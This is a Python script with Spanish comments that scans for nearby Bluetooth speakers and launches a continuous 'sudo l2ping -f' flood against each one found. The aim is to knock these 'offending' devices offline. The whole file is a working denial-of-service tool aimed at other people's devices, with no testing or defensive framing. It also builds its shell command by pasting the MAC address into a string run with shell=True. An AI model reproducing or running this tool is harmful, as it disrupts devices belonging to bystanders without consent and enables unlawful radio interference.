import subprocess
from Scanner import Scanner
from constants import PHONE_BRANDS, SPEAKER_BRANDS, SPEAKER_KEYWORDS

class Deauther:
    def __init__(self, adapter=1):
        self.adapter = adapter

    def deauth_device(self, device_mac):
        """ Intento de deauth un dispositivo Bluetooth usando l2ping flood """
        try:
            command = f"sudo l2ping -i {self.adapter} -f {device_mac}"
            print(f"Enviando un ataque flood a {device_mac} via adapter {self.adapter}...")
            # esto se corre en background para que sea continuo
            process = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
            # opcionalmente podemos almacenar el proceso y terminarlo despues
            return True
        except FileNotFoundError:
            print("Error: comando l2ping no encontrado. Verifique que este isntalado.")
            return False
        except Exception as e:
            print(f"Un error ocurrio durante la deautenticacion: {e}.")
            return False
            
# Speaker Deauthorizer
class SpeakerDeauthorizer:
    def __init__(self, scanner, deauther):
        self.scanner = scanner
        self.deauther = deauther


    def deauthorize_speakers(self):
        """ Intento de deauth un dispositivo Bluetooth usando l2ping flood """
        print("Iniciando Deauth parlantes...")
        speaker_major_class = 4
        speakers = self.scanner.scan_for_devices(major_device_class= speaker_major_class)
        
        if not speakers:
            print("No se encontraron parlantes Bluetooth ofensores")
            return

        print("\nParlantes encontrados:")
        for speaker_mac in speakers:
            print(f"- {speaker_mac}")

        print("\nIniciando Deauth de parlantes ofensores...")
        for speaker_mac in speakers:
            print(f"\nIntentando Deauth el parlante {speaker_mac}...")
            self.deauther.deauth_device(speaker_mac)

        print("\nProceso de Deauth iniciado para todos los parlantes encontrados.")

class SpeakerDeauthorizerRunner:
    @staticmethod
    def run():
        adapter_id = 1
        category = 4
        scanner = Scanner(adapter=adapter_id)
        deauther = Deauther(adapter=adapter_id)
        speaker_deautherizer = SpeakerDeauthorizer(scanner,deauther)
        speaker_deautherizer.deauthorize_speakers()

        print("\n--- Scaneando Dsipositivos de Interes ---")
        found_devices = scanner.scan_for_devices(major_device_class=category)
        if found_devices:
            print(f"\nLista de MAC Addresses de Interes categoria {category}:")
            print(found_devices)
        else:
            print(f"\nNo devices encontrados en categoria {category}.")

if __name__ == "__main__":
    SpeakerDeauthorizerRunner.run()
